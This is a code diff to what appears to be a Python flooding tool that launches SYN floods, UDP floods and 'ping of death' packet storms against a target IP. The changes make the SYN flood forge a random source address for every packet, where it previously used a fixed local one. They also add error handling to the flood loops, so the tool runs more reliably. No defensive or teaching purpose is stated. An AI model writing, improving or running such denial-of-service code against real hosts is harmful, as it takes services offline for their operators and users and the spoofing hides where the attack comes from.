@@ -67,7 +67,7 @@ def server_status(target_ip):
     try:
         socket.create_connection((target_ip, 80), timeout=2)
         print(f"{GREEN}[+] Server {target_ip} is UP!{RESET}")
-    except:
+    except (socket.timeout, socket.error):
         print(f"{RED}[-] Server {target_ip} is DOWN!{RESET}")
 
 def syn_flood(target_ip, target_port, duration):
@@ -75,20 +75,16 @@ def syn_flood(target_ip, target_port, duration):
     print(f"{YELLOW}[+] Starting SYN Flood Attack on {target_ip}:{target_port}{RESET}")
     timeout = time.time() + duration
     packet_count = 0
-
-    # Use a valid source IP (could be a random one from a valid range or fixed for testing)
-    source_ip = "192.168.1.100"  # This is an example of a local IP, replace if necessary.
-
     while time.time() < timeout:
+        ip = IP(src=".".join(map(str, (random.randint(1, 255) for _ in range(4)))), dst=target_ip)
+        tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
+        packet = ip / tcp
         try:
-            ip = IP(src=source_ip, dst=target_ip)  # Using a fixed or valid source IP
-            tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
-            packet = ip / tcp
             send(packet, verbose=False)
             packet_count += 1
             print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
         except Exception as e:
-            print(f"{RED}[ERROR] Issue with sending SYN packets: {str(e)}{RESET}")
+            print(f"{RED}[ERROR] Issue with sending SYN packets: {e}{RESET}")
             break
     print(f"\n{GREEN}[+] SYN Flood Attack Completed. Packets Sent: {packet_count}{RESET}")
 
@@ -100,9 +96,13 @@ def udp_flood(target_ip, target_port, duration):
     timeout = time.time() + duration
     packet_count = 0
     while time.time() < timeout:
-        sock.sendto(packet, (target_ip, target_port))
-        packet_count += 1
-        print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
+        try:
+            sock.sendto(packet, (target_ip, target_port))
+            packet_count += 1
+            print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
+        except Exception as e:
+            print(f"{RED}[ERROR] Issue with sending UDP packets: {e}{RESET}")
+            break
     print(f"\n{GREEN}[+] UDP Flood Attack Completed. Packets Sent: {packet_count}{RESET}")
 
 def ping_of_death(target_ip, duration):
@@ -112,9 +112,13 @@ def ping_of_death(target_ip, duration):
     packet_count = 0
     while time.time() < timeout:
         packet = IP(dst=target_ip) / ICMP() / (b"X" * 65500)
-        send(packet, verbose=False)
-        packet_count += 1
-        print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
+        try:
+            send(packet, verbose=False)
+            packet_count += 1
+            print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
+        except Exception as e:
+            print(f"{RED}[ERROR] Issue with sending Ping of Death packets: {e}{RESET}")
+            break
     print(f"\n{GREEN}[+] Ping of Death Attack Completed. Packets Sent: {packet_count}{RESET}")
 
 def main():
